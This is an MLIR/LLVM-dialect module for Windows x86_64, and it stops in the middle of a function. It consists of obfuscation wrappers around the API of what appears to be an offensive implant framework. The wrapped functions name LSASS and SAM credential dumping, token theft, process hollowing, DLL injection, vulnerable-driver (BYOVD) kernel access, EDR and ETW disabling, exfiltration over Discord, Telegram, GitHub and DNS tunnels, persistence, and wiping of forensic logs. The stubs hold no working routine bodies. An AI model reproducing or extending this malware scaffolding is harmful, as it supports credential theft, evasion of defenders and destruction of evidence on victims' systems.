module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr<270> = dense<32> : vector<4xi64>, !llvm.ptr<271> = dense<32> : vector<4xi64>, !llvm.ptr<272> = dense<64> : vector<4xi64>, i64 = dense<64> : vector<2xi64>, f80 = dense<128> : vector<2xi64>, !llvm.ptr = dense<64> : vector<4xi64>, i1 = dense<8> : vector<2xi64>, i8 = dense<8> : vector<2xi64>, i16 = dense<16> : vector<2xi64>, i32 = dense<32> : vector<2xi64>, f16 = dense<16> : vector<2xi64>, f64 = dense<64> : vector<2xi64>, f128 = dense<128> : vector<2xi64>, "dlti.endianness" = "little", "dlti.mangling_mode" = "w", "dlti.legal_int_widths" = array<i32: 8, 16, 32, 64>, "dlti.stack_alignment" = 128 : i64>, llvm.module_asm = [], llvm.target_triple = "x86_64-w64-windows-gnu"} {
  llvm.func internal @__obfs_wrap_jocky_edr_profiler_shutdown(%arg0: !llvm.ptr) {
    llvm.call @jocky_edr_profiler_shutdown(%arg0) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_edr_should_batch_operations(%arg0: i32) -> i1 {
    %0 = llvm.call @jocky_edr_should_batch_operations(%arg0) : (i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_edr_should_reduce_syscalls(%arg0: i32) -> i1 {
    %0 = llvm.call @jocky_edr_should_reduce_syscalls(%arg0) : (i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_edr_get_syscall_delay(%arg0: i32) -> i32 {
    %0 = llvm.call @jocky_edr_get_syscall_delay(%arg0) : (i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_edr_profiler_analyze(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_edr_profiler_analyze(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_edr_profiler_record_callback(%arg0: !llvm.ptr) {
    llvm.call @jocky_edr_profiler_record_callback(%arg0) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_edr_profiler_init() -> !llvm.ptr {
    %0 = llvm.call @jocky_edr_profiler_init() : () -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_driver_get_fallback_chain(%arg0: i32, %arg1: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @jocky_driver_get_fallback_chain(%arg0, %arg1) : (i32, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_driver_select_best(%arg0: i32) -> !llvm.ptr {
    %0 = llvm.call @jocky_driver_select_best(%arg0) : (i32) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_driver_score_composite(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_driver_score_composite(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_ai_get_threat_level() -> i32 {
    %0 = llvm.call @jocky_ai_get_threat_level() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_ai_init() -> i1 {
    %0 = llvm.call @jocky_ai_init() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_data_hex_decode(%arg0: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @jocky_data_hex_decode(%arg0) : (!llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_data_hex_encode(%arg0: !llvm.ptr, %arg1: i32) -> !llvm.ptr {
    %0 = llvm.call @jocky_data_hex_encode(%arg0, %arg1) : (!llvm.ptr, i32) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_data_base64_decode(%arg0: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @jocky_data_base64_decode(%arg0) : (!llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_data_base64_encode(%arg0: !llvm.ptr, %arg1: i32) -> !llvm.ptr {
    %0 = llvm.call @jocky_data_base64_encode(%arg0, %arg1) : (!llvm.ptr, i32) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_impersonate_user(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_impersonate_user(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_token_enumerate() -> !llvm.ptr {
    %0 = llvm.call @jocky_token_enumerate() : () -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_credentials_enumerate() -> !llvm.ptr {
    %0 = llvm.call @jocky_credentials_enumerate() : () -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_lsass_dump() -> i32 {
    %0 = llvm.call @jocky_lsass_dump() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_module_info(%arg0: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @jocky_module_info(%arg0) : (!llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_thread_get_info(%arg0: i32) -> !llvm.ptr {
    %0 = llvm.call @jocky_thread_get_info(%arg0) : (i32) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_linux_cleanup_lastlog() -> i32 {
    %0 = llvm.call @jocky_linux_cleanup_lastlog() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_linux_cleanup_wtmp() -> i32 {
    %0 = llvm.call @jocky_linux_cleanup_wtmp() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_linux_cleanup_audit() -> i32 {
    %0 = llvm.call @jocky_linux_cleanup_audit() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_systemd_remove(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_systemd_remove(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_cron_remove(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_cron_remove(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_systemd_install(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_systemd_install(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_cron_install(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_cron_install(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_clear_browser_history(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_clear_browser_history(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_clear_browser_cache(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_clear_browser_cache(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_wipe_temp_files(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_wipe_temp_files(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_wipe_free_space() -> i1 {
    %0 = llvm.call @jocky_wipe_free_space() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_clear_mft_timestamps() -> i1 {
    %0 = llvm.call @jocky_clear_mft_timestamps() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_clear_recent_files() -> i1 {
    %0 = llvm.call @jocky_clear_recent_files() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_wipe_thumbcache() -> i1 {
    %0 = llvm.call @jocky_wipe_thumbcache() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_wipe_jumplist() -> i1 {
    %0 = llvm.call @jocky_wipe_jumplist() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_registry_delete_key(%arg0: i32, %arg1: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_registry_delete_key(%arg0, %arg1) : (i32, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_registry_dump_lsa_secrets() -> i32 {
    %0 = llvm.call @jocky_registry_dump_lsa_secrets() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_registry_dump_security() -> i32 {
    %0 = llvm.call @jocky_registry_dump_security() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_registry_dump_sam() -> i32 {
    %0 = llvm.call @jocky_registry_dump_sam() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_registry_get_value(%arg0: i32, %arg1: !llvm.ptr, %arg2: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @jocky_registry_get_value(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_registry_enum_values(%arg0: i32, %arg1: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @jocky_registry_enum_values(%arg0, %arg1) : (i32, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_registry_enum_keys(%arg0: i32, %arg1: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @jocky_registry_enum_keys(%arg0, %arg1) : (i32, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_decompress_data(%arg0: !llvm.ptr, %arg1: i32) -> !llvm.ptr {
    %0 = llvm.call @jocky_decompress_data(%arg0, %arg1) : (!llvm.ptr, i32) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_compress_data(%arg0: !llvm.ptr, %arg1: i32) -> !llvm.ptr {
    %0 = llvm.call @jocky_compress_data(%arg0, %arg1) : (!llvm.ptr, i32) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_download_file(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_download_file(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_http_post(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i32, %arg3: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_http_post(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, !llvm.ptr, i32, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_http_get(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i64) -> i64 {
    %0 = llvm.call @jocky_http_get(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i64) -> i64
    llvm.return %0 : i64
  }
  llvm.func internal @__obfs_wrap_exfil_local_cdn(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: !llvm.ptr) -> i32 {
    %0 = llvm.call @exfil_local_cdn(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_exfil_discord_webhook(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i32 {
    %0 = llvm.call @exfil_discord_webhook(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_exfil_dns_tunnel(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i32 {
    %0 = llvm.call @exfil_dns_tunnel(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_blindside_unhook_ntdll() -> i1 {
    %0 = llvm.call @blindside_unhook_ntdll() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_edrhoker_detect() -> i1 {
    %0 = llvm.call @edrhoker_detect() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_exploit_token_replacement(%arg0: i32, %arg1: i32) -> i32 {
    %0 = llvm.call @jocky_exploit_token_replacement(%arg0, %arg1) : (i32, i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_exploit_disable_callbacks() -> i32 {
    %0 = llvm.call @jocky_exploit_disable_callbacks() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_btr_mask_module(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @btr_mask_module(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_btr_disable_notifications() -> i1 {
    %0 = llvm.call @btr_disable_notifications() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_byovd_test_exploit(%arg0: i32) -> i32 {
    %0 = llvm.call @byovd_test_exploit(%arg0) : (i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_byovd_load_driver(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @byovd_load_driver(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_ai_score_threat() -> f64 {
    %0 = llvm.call @ai_score_threat() : () -> f64
    llvm.return %0 : f64
  }
  llvm.func internal @__obfs_wrap_ai_collect_telemetry() -> !llvm.ptr {
    %0 = llvm.call @ai_collect_telemetry() : () -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_ai_init() -> i32 {
    %0 = llvm.call @ai_init() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_provenance_record(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr) {
    llvm.call @provenance_record(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_audit_verify() -> i32 {
    %0 = llvm.call @audit_verify() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_audit_export(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @audit_export(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_audit_init(%arg0: i32) -> i1 {
    %0 = llvm.call @audit_init(%arg0) : (i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_audit_log(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: !llvm.ptr) {
    llvm.call @audit_log(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_registry_close_key(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_registry_close_key(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_registry_set_value(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: i32, %arg4: i32) -> i1 {
    %0 = llvm.call @jocky_registry_set_value(%arg0, %arg1, %arg2, %arg3, %arg4) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_registry_create_key(%arg0: i32, %arg1: !llvm.ptr, %arg2: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_registry_create_key(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_sandbox_export_trace(%arg0: i32, %arg1: !llvm.ptr) -> i1 {
    %0 = llvm.call @sandbox_export_trace(%arg0, %arg1) : (i32, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_sandbox_wait(%arg0: i32) -> i32 {
    %0 = llvm.call @sandbox_wait(%arg0) : (i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_sandbox_monitor(%arg0: i32) -> i32 {
    %0 = llvm.call @sandbox_monitor(%arg0) : (i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_sandbox_set_limits(%arg0: i32, %arg1: i64, %arg2: i32, %arg3: i64) -> i1 {
    %0 = llvm.call @sandbox_set_limits(%arg0, %arg1, %arg2, %arg3) : (i32, i64, i32, i64) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_sandbox_spawn(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i32 {
    %0 = llvm.call @sandbox_spawn(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_crypto_aes256_decrypt(%arg0: !llvm.ptr, %arg1: i32, %arg2: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @crypto_aes256_decrypt(%arg0, %arg1, %arg2) : (!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_crypto_aes256_encrypt(%arg0: !llvm.ptr, %arg1: i32, %arg2: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @crypto_aes256_encrypt(%arg0, %arg1, %arg2) : (!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_crypto_generate_key(%arg0: i32) -> !llvm.ptr {
    %0 = llvm.call @crypto_generate_key(%arg0) : (i32) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_fs_write_file(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i64) -> i1 {
    %0 = llvm.call @fs_write_file(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i64) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_fs_read_file(%arg0: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @fs_read_file(%arg0) : (!llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_fs_file_size(%arg0: !llvm.ptr) -> i64 {
    %0 = llvm.call @fs_file_size(%arg0) : (!llvm.ptr) -> i64
    llvm.return %0 : i64
  }
  llvm.func internal @__obfs_wrap_fs_list_files(%arg0: !llvm.ptr, %arg1: i1) -> !llvm.ptr {
    %0 = llvm.call @fs_list_files(%arg0, %arg1) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_fs_exists(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @fs_exists(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_cleanup_usn_journal() -> i32 {
    %0 = llvm.call @jocky_cleanup_usn_journal() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_cleanup_event_logs(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_cleanup_event_logs(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_forensics_clear_dns_cache() -> i32 {
    %0 = llvm.call @forensics_clear_dns_cache() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_forensics_flush_arp_cache() -> i32 {
    %0 = llvm.call @forensics_flush_arp_cache() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_forensics_wipe_cmd_history() -> i32 {
    %0 = llvm.call @forensics_wipe_cmd_history() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_forensics_wipe_powershell_history() -> i32 {
    %0 = llvm.call @forensics_wipe_powershell_history() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_cleanup_all() {
    llvm.call @jocky_cleanup_all() : () -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_clear_srum() -> i1 {
    %0 = llvm.call @jocky_clear_srum() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_patch_amcache() -> i1 {
    %0 = llvm.call @jocky_patch_amcache() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_patch_shimcache() -> i1 {
    %0 = llvm.call @jocky_patch_shimcache() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_wipe_prefetch() {
    llvm.call @jocky_wipe_prefetch() : () -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_wipe_artifacts(%arg0: !llvm.ptr) {
    llvm.call @jocky_wipe_artifacts(%arg0) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_clear_logs() {
    llvm.call @jocky_clear_logs() : () -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_self_delete() {
    llvm.call @jocky_self_delete() : () -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_exfil_github(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
    %0 = llvm.call @jocky_exfil_github(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_exfil_telegram(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
    %0 = llvm.call @jocky_exfil_telegram(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_exfil_discord(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
    %0 = llvm.call @jocky_exfil_discord(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_exfil_dns(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
    %0 = llvm.call @jocky_exfil_dns(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_exfil_front(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: !llvm.ptr, %arg4: i32) -> i1 {
    %0 = llvm.call @jocky_exfil_front(%arg0, %arg1, %arg2, %arg3, %arg4) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_exfil_encrypt(%arg0: !llvm.ptr, %arg1: i32, %arg2: !llvm.ptr, %arg3: i32) {
    llvm.call @jocky_exfil_encrypt(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i32, !llvm.ptr, i32) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_rdll_inject(%arg0: i32, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
    %0 = llvm.call @jocky_rdll_inject(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_process_hollow(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
    %0 = llvm.call @jocky_process_hollow(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_elevate_token(%arg0: !llvm.ptr, %arg1: i32) -> i1 {
    %0 = llvm.call @jocky_elevate_token(%arg0, %arg1) : (!llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_driver_map_kernel(%arg0: !llvm.ptr, %arg1: i64, %arg2: i32) -> !llvm.ptr {
    %0 = llvm.call @jocky_driver_map_kernel(%arg0, %arg1, %arg2) : (!llvm.ptr, i64, i32) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_driver_write_phys(%arg0: !llvm.ptr, %arg1: i64, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
    %0 = llvm.call @jocky_driver_write_phys(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i64, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_driver_read_phys(%arg0: !llvm.ptr, %arg1: i64, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
    %0 = llvm.call @jocky_driver_read_phys(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i64, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_byovd_unload(%arg0: !llvm.ptr) {
    llvm.call @jocky_byovd_unload(%arg0) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_byovd_load(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_byovd_load(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_spoof_syscall(%arg0: i32, %arg1: i64, %arg2: i64, %arg3: i64, %arg4: i64) -> i64 {
    %0 = llvm.call @jocky_spoof_syscall(%arg0, %arg1, %arg2, %arg3, %arg4) : (i32, i64, i64, i64, i64) -> i64
    llvm.return %0 : i64
  }
  llvm.func internal @__obfs_wrap_jocky_spoof_call(%arg0: !llvm.ptr, %arg1: i64, %arg2: i64, %arg3: i64, %arg4: i64) -> i64 {
    %0 = llvm.call @jocky_spoof_call(%arg0, %arg1, %arg2, %arg3, %arg4) : (!llvm.ptr, i64, i64, i64, i64) -> i64
    llvm.return %0 : i64
  }
  llvm.func internal @__obfs_wrap_jocky_disable_edr_callbacks(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_disable_edr_callbacks(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_disable_etw(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_disable_etw(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_hide_from_usermode() -> i1 {
    %0 = llvm.call @jocky_hide_from_usermode() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_spoof_process_name(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_spoof_process_name(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_patch_etw_provider() -> i1 {
    %0 = llvm.call @jocky_patch_etw_provider() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_disable_wdfilter() -> i1 {
    %0 = llvm.call @jocky_disable_wdfilter() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_disable_minifilter_callbacks() -> i1 {
    %0 = llvm.call @jocky_disable_minifilter_callbacks() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_disable_ob_callbacks() -> i1 {
    %0 = llvm.call @jocky_disable_ob_callbacks() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_enable_direct_syscalls() -> i1 {
    %0 = llvm.call @jocky_enable_direct_syscalls() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_unhook_kernel32() -> i1 {
    %0 = llvm.call @jocky_unhook_kernel32() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_unhook_ntdll() -> i1 {
    %0 = llvm.call @jocky_unhook_ntdll() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_decrypt_rc4(%arg0: !llvm.ptr, %arg1: i32, %arg2: !llvm.ptr, %arg3: i32) {
